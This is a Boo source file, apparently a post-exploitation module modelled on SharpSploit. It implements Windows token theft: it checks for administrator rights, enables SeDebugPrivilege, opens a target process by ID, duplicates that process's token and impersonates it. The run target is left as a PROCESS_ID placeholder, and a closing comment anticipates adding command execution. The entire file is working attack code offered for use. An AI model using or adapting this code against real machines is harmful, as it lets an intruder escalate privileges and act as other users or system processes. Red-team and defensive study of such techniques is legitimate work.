/*
    This module is inspired from SharpSploit (https://github.com/cobbr/SharpSploit)
*/
import System
import System.ComponentModel
import System.Diagnostics
import System.Runtime.InteropServices
import System.Security.Principal
import System.Text
import Microsoft.Win32


public enum TOKEN_TYPE:
    TokenPrimary = 1
    TokenImpersonation


public enum _SECURITY_IMPERSONATION_LEVEL:
    SecurityAnonymous
    SecurityIdentification
    SecurityImpersonation
    SecurityDelegation


public enum ProcessAccessFlags :
    PROCESS_ALL_ACCESS = 0x001F0FFF
    PROCESS_CREATE_PROCESS = 0x0080
    PROCESS_CREATE_THREAD = 0x0002
    PROCESS_DUP_HANDLE = 0x0040
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    PROCESS_SET_INFORMATION = 0x0200
    PROCESS_SET_QUOTA = 0x0100
    PROCESS_SUSPEND_RESUME = 0x0800
    PROCESS_TERMINATE = 0x0001
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_WRITE = 0x0020
    SYNCHRONIZE = 0x00100000


public enum ACCESS_MASK :
    DELETE = 0x00010000
    READ_CONTROL = 0x00020000
    WRITE_DAC = 0x00040000
    WRITE_OWNER = 0x00080000
    SYNCHRONIZE = 0x00100000
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    STANDARD_RIGHTS_READ = 0x00020000
    STANDARD_RIGHTS_WRITE = 0x00020000
    STANDARD_RIGHTS_EXECUTE = 0x00020000
    STANDARD_RIGHTS_ALL = 0x001F0000
    SPECIFIC_RIGHTS_ALL = 0x0000FFF
    ACCESS_SYSTEM_SECURITY = 0x01000000
    MAXIMUM_ALLOWED = 0x02000000
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    GENERIC_EXECUTE = 0x20000000
    GENERIC_ALL = 0x10000000
    DESKTOP_READOBJECTS = 0x00000001
    DESKTOP_CREATEWINDOW = 0x00000002
    DESKTOP_CREATEMENU = 0x00000004
    DESKTOP_HOOKCONTROL = 0x00000008
    DESKTOP_JOURNALRECORD = 0x00000010
    DESKTOP_JOURNALPLAYBACK = 0x00000020
    DESKTOP_ENUMERATE = 0x00000040
    DESKTOP_WRITEOBJECTS = 0x00000080
    DESKTOP_SWITCHDESKTOP = 0x00000100
    WINSTA_ENUMDESKTOPS = 0x00000001
    WINSTA_READATTRIBUTES = 0x00000002
    WINSTA_ACCESSCLIPBOARD = 0x00000004
    WINSTA_CREATEDESKTOP = 0x00000008
    WINSTA_WRITEATTRIBUTES = 0x00000010
    WINSTA_ACCESSGLOBALATOMS = 0x00000020
    WINSTA_EXITWINDOWS = 0x00000040
    WINSTA_ENUMERATE = 0x00000100
    WINSTA_READSCREEN = 0x00000200
    WINSTA_ALL_ACCESS = 0x0000037F


[StructLayout(LayoutKind.Sequential)]
public struct _SECURITY_ATTRIBUTES:
    nLength as UInt32
    lpSecurityDescriptor as IntPtr
    bInheritHandle as Boolean


[StructLayout(LayoutKind.Sequential)]
public struct _LUID:
    public LowPart as UInt32
    public HighPart as UInt32


[StructLayout(LayoutKind.Sequential)]
public struct _LUID_AND_ATTRIBUTES:
    public Luid as _LUID
    public Attributes as UInt32


[StructLayout(LayoutKind.Sequential)]
public struct _TOKEN_PRIVILEGES:
    public PrivilegeCount as UInt32
    public Privileges as _LUID_AND_ATTRIBUTES


[DllImport("kernel32.dll")]
public static def OpenProcessToken(
    hProcess as IntPtr,
    dwDesiredAccess as UInt32,
    ref hToken as IntPtr
) as bool:
    pass


[DllImport("kernel32.dll")]
public static def OpenProcess(
    dwDesiredAccess as ProcessAccessFlags,
    bInheritHandle as bool,
    dwProcessId as UInt32
) as IntPtr:
    pass


[DllImport("kernel32.dll")]
public static def CloseHandle(
    hProcess as IntPtr
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def DuplicateTokenEx(
    hExistingToken as IntPtr,
    dwDesiredAccess as UInt32,
    ref lpTokenAttributes as _SECURITY_ATTRIBUTES,
    ImpersonationLevel as _SECURITY_IMPERSONATION_LEVEL,
    TokenType as TOKEN_TYPE,
    ref phNewToken as IntPtr
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def ImpersonateLoggedOnUser(
    hToken as IntPtr
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def LookupPrivilegeValue(
    lpSystemName as String,
    lpName as String,
    ref luid as _LUID
) as bool:
    pass


[DllImport("advapi32.dll", SetLastError: true)]
public static def AdjustTokenPrivileges(
    TokenHandle as IntPtr,
    DisableAllPrivileges as bool,
    ref NewState as _TOKEN_PRIVILEGES,
    BufferLengthInBytes as UInt32,
    ref PreviousState as _TOKEN_PRIVILEGES,
    ref ReturnLengthInBytes as UInt32
) as bool:
    pass


private def GetTokenForProcess(ProcessID as UInt32) as IntPtr:
    STANDARD_RIGHTS_REQUIRED as UInt32 = 0x000F0000
    STANDARD_RIGHTS_READ as UInt32 = 0x00020000
    TOKEN_ASSIGN_PRIMARY as UInt32 = 0x0001
    TOKEN_DUPLICATE as UInt32 = 0x0002
    TOKEN_IMPERSONATE as UInt32 = 0x0004
    TOKEN_QUERY as UInt32 = 0x0008
    TOKEN_QUERY_SOURCE as UInt32 = 0x0010
    TOKEN_ADJUST_PRIVILEGES as UInt32 = 0x0020
    TOKEN_ADJUST_GROUPS as UInt32 = 0x0040
    TOKEN_ADJUST_DEFAULT as UInt32 = 0x0080
    TOKEN_ADJUST_SESSIONID as UInt32 = 0x0100
    TOKEN_READ as UInt32 = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS as UInt32 = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID)
    TOKEN_ALT as UInt32 = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY)

    hProcess as IntPtr
    hProcess = OpenProcess(ProcessAccessFlags.PROCESS_QUERY_INFORMATION, true, ProcessID)
    if (hProcess == IntPtr.Zero):
        //print "OpenProcess() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
        return IntPtr.Zero

    hProcessToken as IntPtr = IntPtr.Zero
    if (OpenProcessToken(hProcess, TOKEN_ALT, hProcessToken)):
        CloseHandle(hProcess)
        return hProcessToken
    else:
        //print "OpenProcessToken() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
        return IntPtr.Zero


public def ImpersonateProcess(ProcessID as UInt32) as bool:
    hProcessToken as IntPtr
    hProcessToken = GetTokenForProcess(ProcessID)
    if (hProcessToken == IntPtr.Zero):
        return false

    securityAttributes as _SECURITY_ATTRIBUTES
    hDuplicateToken as IntPtr
    if (DuplicateTokenEx(
            hProcessToken,
            ACCESS_MASK.MAXIMUM_ALLOWED,
            securityAttributes,
            _SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
            TOKEN_TYPE.TokenPrimary,
            hDuplicateToken
        )):
        if (ImpersonateLoggedOnUser(hDuplicateToken)):
            CloseHandle(hProcessToken)
            return true
        else:
            //print "ImpersonateLoggedOnUser() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
            CloseHandle(hProcessToken)
            CloseHandle(hDuplicateToken)
            return false
    else:
        //print "DuplicateTokenEx() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
        CloseHandle(hProcessToken)
        return false


public def GetCurrentProcessToken() as IntPtr:
    STANDARD_RIGHTS_REQUIRED as UInt32 = 0x000F0000
    STANDARD_RIGHTS_READ as UInt32 = 0x00020000
    TOKEN_ASSIGN_PRIMARY as UInt32 = 0x0001
    TOKEN_DUPLICATE as UInt32 = 0x0002
    TOKEN_IMPERSONATE as UInt32 = 0x0004
    TOKEN_QUERY as UInt32 = 0x0008
    TOKEN_QUERY_SOURCE as UInt32 = 0x0010
    TOKEN_ADJUST_PRIVILEGES as UInt32 = 0x0020
    TOKEN_ADJUST_GROUPS as UInt32 = 0x0040
    TOKEN_ADJUST_DEFAULT as UInt32 = 0x0080
    TOKEN_ADJUST_SESSIONID as UInt32 = 0x0100
    TOKEN_READ as UInt32 = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
    TOKEN_ALL_ACCESS as UInt32 = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
        TOKEN_ADJUST_SESSIONID)
    TOKEN_ALT as UInt32 = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY)

    currentProcessToken as IntPtr
    if (OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ALL_ACCESS, currentProcessToken)):
        return currentProcessToken
    else:
        print "OpenProcessToken() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
        return IntPtr.Zero


public def EnableTokenPrivilege(ref hToken as IntPtr, Privilege as string) as bool:
    Privileges as List = ["SeAssignPrimaryTokenPrivilege",
        "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
        "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
        "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
        "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
        "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
        "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
        "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
        "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
        "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
        "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" ]
    if (not Privileges.Contains(Privilege)):
        return false
    luid as _LUID
    if (not LookupPrivilegeValue(null, Privilege, luid)):
        print "LookupPrivilegeValue() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
        return false

    luidAndAttributes as _LUID_AND_ATTRIBUTES
    luidAndAttributes.Luid = luid
    luidAndAttributes.Attributes = 0x2 //SE_PRIVILEGE_ENABLED

    newState as _TOKEN_PRIVILEGES
    newState.PrivilegeCount = 1
    newState.Privileges = luidAndAttributes

    previousState as _TOKEN_PRIVILEGES
    returnLength as UInt32 = 0
    if (not AdjustTokenPrivileges(hToken, false, newState, Marshal.SizeOf(newState), previousState, returnLength)):
        print "AdjustTokenPrivileges() Error: " + Win32Exception(Marshal.GetLastWin32Error()).Message
        return false

    return true


public static def IsHighIntegrity() as bool:
    identity = WindowsIdentity.GetCurrent()
    principal = WindowsPrincipal(identity)
    return principal.IsInRole(WindowsBuiltInRole.Administrator)


public static def Main():
    ProcessID = "PROCESS_ID"
    if not IsHighIntegrity():
        print "[X] Module must be launched in high integrity"
    currentProcessToken as IntPtr = GetCurrentProcessToken()
    if (currentProcessToken == IntPtr.Zero):
        return
    if not EnableTokenPrivilege(currentProcessToken, "SeDebugPrivilege"):
        return
    print "Impersonating process with ID: " + ProcessID + "..."

    ProcID as int = Int32.Parse(ProcessID)
    if (ImpersonateProcess(ProcID)):
        print "Successfully impersonated process with ID: " + ProcessID + " (" + Process.GetProcessById(ProcID).ProcessName + ")"
    else:
        print "Failed to impersonate process with ID: " + ProcessID

    // Eventually add code there to execute command
